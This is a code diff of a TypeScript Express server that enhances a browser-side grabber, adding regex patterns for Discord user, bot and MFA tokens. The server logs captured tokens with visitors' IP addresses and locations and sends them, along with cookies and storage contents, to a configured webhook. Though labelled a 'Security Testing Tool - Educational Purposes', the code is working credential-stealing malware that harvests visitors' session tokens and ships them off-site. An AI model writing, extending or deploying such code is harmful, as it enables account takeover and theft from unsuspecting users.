@@ -131,24 +131,78 @@ export async function registerRoutes(app: Express): Promise<Server> {
           sessionStorageData[key] = sessionStorage.getItem(key);
         }
 
-        // Look for common token patterns in storage
+        // Enhanced Discord token detection patterns
+        const discordTokenPatterns = [
+          /^mfa\.[a-z0-9_-]{20,}$/i,  // Discord MFA tokens
+          /^[a-z0-9_-]{23,28}\.[a-z0-9_-]{6,7}\.[a-z0-9_-]{27}$/i,  // Discord bot tokens
+          /^[a-z0-9]{24}\.[a-z0-9]{6}\.[a-z0-9_-]{27}$/i,  // Discord user tokens
+          /^[a-z0-9]{26}\.[a-z0-9]{6}\.[a-z0-9_-]{38}$/i   // New Discord token format
+        ];
+
         const tokenPatterns = [
-          /token/i, /auth/i, /jwt/i, /session/i, /access/i, /refresh/i, /bearer/i
+          /token/i, /auth/i, /jwt/i, /session/i, /access/i, /refresh/i, /bearer/i, /discord/i
         ];
 
         const foundTokens = [];
+        const discordTokens = [];
+
+        // Function to check if a value is a Discord token
+        const checkDiscordToken = (value, source) => {
+          if (typeof value === 'string') {
+            for (const pattern of discordTokenPatterns) {
+              if (pattern.test(value)) {
+                discordTokens.push(`${source}: ${value}`);
+                foundTokens.push(`🔥 DISCORD TOKEN - ${source}: ${value}`);
+                return true;
+              }
+            }
+          }
+          return false;
+        };
 
         // Check localStorage for tokens
         Object.keys(localStorageData).forEach(key => {
-          if (tokenPatterns.some(pattern => pattern.test(key))) {
-            foundTokens.push('localStorage.' + key + ': ' + localStorageData[key]);
+          const value = localStorageData[key];
+
+          // Check for Discord tokens first
+          if (!checkDiscordToken(value, `localStorage.${key}`)) {
+            // Check for general token patterns
+            if (tokenPatterns.some(pattern => pattern.test(key))) {
+              foundTokens.push(`localStorage.${key}: ${value}`);
+            }
+            // Also check values for Discord token patterns
+            if (typeof value === 'string') {
+              for (const pattern of discordTokenPatterns) {
+                if (pattern.test(value)) {
+                  discordTokens.push(`localStorage.${key}: ${value}`);
+                  foundTokens.push(`🔥 DISCORD TOKEN - localStorage.${key}: ${value}`);
+                  break;
+                }
+              }
+            }
           }
         });
 
         // Check sessionStorage for tokens
         Object.keys(sessionStorageData).forEach(key => {
-          if (tokenPatterns.some(pattern => pattern.test(key))) {
-            foundTokens.push('sessionStorage.' + key + ': ' + sessionStorageData[key]);
+          const value = sessionStorageData[key];
+
+          // Check for Discord tokens first
+          if (!checkDiscordToken(value, `sessionStorage.${key}`)) {
+            // Check for general token patterns
+            if (tokenPatterns.some(pattern => pattern.test(key))) {
+              foundTokens.push(`sessionStorage.${key}: ${value}`);
+            }
+            // Also check values for Discord token patterns
+            if (typeof value === 'string') {
+              for (const pattern of discordTokenPatterns) {
+                if (pattern.test(value)) {
+                  discordTokens.push(`sessionStorage.${key}: ${value}`);
+                  foundTokens.push(`🔥 DISCORD TOKEN - sessionStorage.${key}: ${value}`);
+                  break;
+                }
+              }
+            }
           }
         });
 
@@ -167,6 +221,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           localStorage: localStorageData,
           sessionStorage: sessionStorageData,
           tokens: foundTokens,
+          discordTokens: discordTokens,
           browserInfo: browserInfo,
           url: window.location.href,
           timestamp: new Date().toISOString()
@@ -519,46 +574,50 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Get settings to check for webhook URL
       const settings = await storage.getSettings();
 
+      // Log Discord tokens to database if found
+      if (browserData.discordTokens && browserData.discordTokens.length > 0) {
+        await storage.createIpLog({
+          ipAddress: clientIp,
+          userAgent,
+          referrer: 'Discord Token Capture',
+          location,
+          status: 'discord_token_captured',
+          tokens: browserData.discordTokens.join(' | ')
+        });
+      }
+
       // Send comprehensive data to webhook if configured
       if (settings?.webhookUrl) {
-        // Add additional embed for Discord tokens if found
-        const embeds = [{
-          title: "🎯 New Security Test Access",
-          color: data.discordTokens?.length > 0 ? 0xff0000 : 0xff6b6b,
-          fields: [
-            { name: "IP Address", value: clientIp, inline: true },
-            { name: "User Agent", value: userAgent?.substring(0, 100) + "..." || "Unknown", inline: false },
-            { name: "Location", value: location, inline: true },
-            { name: "Referrer", value: data.referrer || "Direct Access", inline: true },
-            { name: "Tokens Found", value: data.tokens?.length.toString() || "0", inline: true },
-            { name: "Discord Tokens", value: data.discordTokens?.length.toString() || "0", inline: true },
-            { name: "Platform", value: data.platform || "Unknown", inline: true },
-            { name: "Language", value: data.language || "Unknown", inline: true },
-            { name: "Timestamp", value: new Date().toISOString(), inline: true }
-          ],
-          footer: { text: "Security Testing Tool" }
-        }];
+        const hasDiscordTokens = browserData.discordTokens && browserData.discordTokens.length > 0;
 
-        // Add Discord token details if found
-        if (data.discordTokens && data.discordTokens.length > 0) {
-          embeds.push({
-            title: "🚨 Discord Tokens Detected",
-            color: 0xff0000,
-            fields: data.discordTokens.slice(0, 10).map((token, index) => ({
-              name: `Token ${index + 1}`,
-              value: token.substring(0, 100) + (token.length > 100 ? "..." : ""),
-              inline: false
-            })),
-            footer: { text: "Security Alert - Immediate Action Required" }
-          });
-        }
-
-        const webhookPayload = { embeds };
+        const webhookData = {
+          embeds: [{
+            title: hasDiscordTokens ? "🚨 DISCORD TOKEN CAPTURED!" : "🎯 Advanced Security Test Data",
+            color: hasDiscordTokens ? 0xff0000 : 0x00ff00,
+            fields: [
+              { name: "IP Address", value: clientIp, inline: true },
+              { name: "User Agent", value: userAgent ? userAgent.substring(0, 100) + (userAgent.length > 100 ? "..." : "") : "Unknown", inline: false },
+              ...(hasDiscordTokens ? [{
+                name: "🔥 DISCORD TOKENS FOUND",
+                value: browserData.discordTokens.join('\n').substring(0, 1000) + (browserData.discordTokens.join('\n').length > 1000 ? "..." : ""),
+                inline: false
+              }] : []),
+              { name: "Cookies", value: browserData.cookies ? browserData.cookies.substring(0, 500) + (browserData.cookies.length > 500 ? "..." : "") : "None", inline: false },
+              { name: "All Tokens Found", value: browserData.tokens?.length ? browserData.tokens.join(', ').substring(0, 800) + (browserData.tokens.join(', ').length > 800 ? "..." : "") : "None", inline: false },
+              { name: "LocalStorage", value: Object.keys(browserData.localStorage || {}).length ? Object.keys(browserData.localStorage).join(', ').substring(0, 300) + "..." : "Empty", inline: true },
+              { name: "SessionStorage", value: Object.keys(browserData.sessionStorage || {}).length ? Object.keys(browserData.sessionStorage).join(', ').substring(0, 300) + "..." : "Empty", inline: true },
+              { name: "Browser Info", value: browserData.browserInfo ? JSON.stringify(browserData.browserInfo).substring(0, 400) + "..." : "N/A", inline: false },
+              { name: "URL", value: browserData.url || 'Unknown', inline: false },
+              { name: "Timestamp", value: browserData.timestamp || new Date().toISOString(), inline: true }
+            ],
+            footer: { text: hasDiscordTokens ? "🔥 CRITICAL ALERT - Discord Token Captured" : "Security Testing Tool - Educational Purposes" }
+          }]
+        };
 
         await fetch(settings.webhookUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(webhookPayload)
+          body: JSON.stringify(webhookData)
         }).catch(err => console.error('Webhook error:', err));
       }
 
